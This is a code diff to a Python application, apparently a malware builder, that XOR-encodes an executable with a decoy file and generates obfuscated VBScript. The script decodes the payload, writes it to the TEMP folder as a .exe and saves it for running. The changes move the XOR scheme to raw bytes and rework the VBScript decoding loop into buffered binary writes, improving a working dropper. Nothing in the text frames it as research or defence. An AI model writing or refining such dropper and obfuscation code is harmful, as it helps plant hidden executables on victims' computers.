@@ -743,10 +743,8 @@ class K4LIApp:
         # ── Base64 encode ─────────────────────────────────────────────────
         self._conv_ln("\n[3/4]  Encoding to base64...", "cy")
         time.sleep(0.1)
-        xor_key  = random.randint(1, 42)
-        _exe_b64_raw = base64.b64encode(exe_data).decode("ascii")
-        _exe_chars_xored = bytes(ord(c) ^ xor_key for c in _exe_b64_raw)
-        exe_b64  = base64.b64encode(_exe_chars_xored).decode("ascii")
+        xor_key  = random.randint(1, 254)
+        exe_b64  = base64.b64encode(bytes(b ^ xor_key for b in exe_data)).decode("ascii")
         file_b64 = base64.b64encode(file_data).decode("ascii")
         self._conv_ln(f"       EXE  : {len(exe_b64):,} chars", "g3")
         self._conv_ln(f"       FILE : {len(file_b64):,} chars", "g3")
@@ -814,15 +812,23 @@ class K4LIApp:
                 '  Dim rawX : rawX = CallByName(nd, _nv, VbGet)\n'
                 f'  Dim xk : xk = {xor_key}\n'
                 '  Dim nX : nX = UBound(rawX)\n'
-                '  Dim px() : ReDim px(nX)\n'
-                '  Dim jx\n'
-                '  For jx = 0 To nX\n'
-                '    px(jx) = Chr(CInt(rawX(jx)) Xor xk)\n'
-                '  Next\n'
-                '  nd.Text = Join(px, "")\n'
                 '  Set stm = CreateObject(_c4)\n'
                 '  stm.Type = 1 : stm.Open\n'
-                '  stm.Write CallByName(nd, _nv, VbGet)\n'
+                '  Dim ob(65534)\n'
+                '  Dim bi : bi = 0\n'
+                '  Dim jx\n'
+                '  For jx = 0 To nX\n'
+                '    ob(bi) = CByte(rawX(jx) Xor xk)\n'
+                '    bi = bi + 1\n'
+                '    If bi = 65535 Then\n'
+                '      stm.Write ob\n'
+                '      bi = 0\n'
+                '    End If\n'
+                '  Next\n'
+                '  If bi > 0 Then\n'
+                '    ReDim Preserve ob(bi - 1)\n'
+                '    stm.Write ob\n'
+                '  End If\n'
                 '  stm.Position = 0\n'
                 f'  Dim exeT : exeT = Environ("TEMP") & "\\k4li_{rid}.exe"\n'
                 '  CallByName stm, _sv, VbMethod, exeT, 2\n'
@@ -923,15 +929,23 @@ class K4LIApp:
                 '  Dim rawX : rawX = CallByName(nd, _nv, VbGet)\n'
                 f'  Dim xk : xk = {xor_key}\n'
                 '  Dim nX : nX = UBound(rawX)\n'
-                '  Dim px() : ReDim px(nX)\n'
-                '  Dim jx\n'
-                '  For jx = 0 To nX\n'
-                '    px(jx) = Chr(CInt(rawX(jx)) Xor xk)\n'
-                '  Next\n'
-                '  nd.Text = Join(px, "")\n'
                 '  Set stm = CreateObject(_c4)\n'
                 '  stm.Type = 1 : stm.Open\n'
-                '  stm.Write CallByName(nd, _nv, VbGet)\n'
+                '  Dim ob(65534)\n'
+                '  Dim bi : bi = 0\n'
+                '  Dim jx\n'
+                '  For jx = 0 To nX\n'
+                '    ob(bi) = CByte(rawX(jx) Xor xk)\n'
+                '    bi = bi + 1\n'
+                '    If bi = 65535 Then\n'
+                '      stm.Write ob\n'
+                '      bi = 0\n'
+                '    End If\n'
+                '  Next\n'
+                '  If bi > 0 Then\n'
+                '    ReDim Preserve ob(bi - 1)\n'
+                '    stm.Write ob\n'
+                '  End If\n'
                 '  stm.Position = 0\n'
                 f'  Dim exeT : exeT = Environ("TEMP") & "\\k4li_{rid}.exe"\n'
                 '  CallByName stm, _sv, VbMethod, exeT, 2\n'
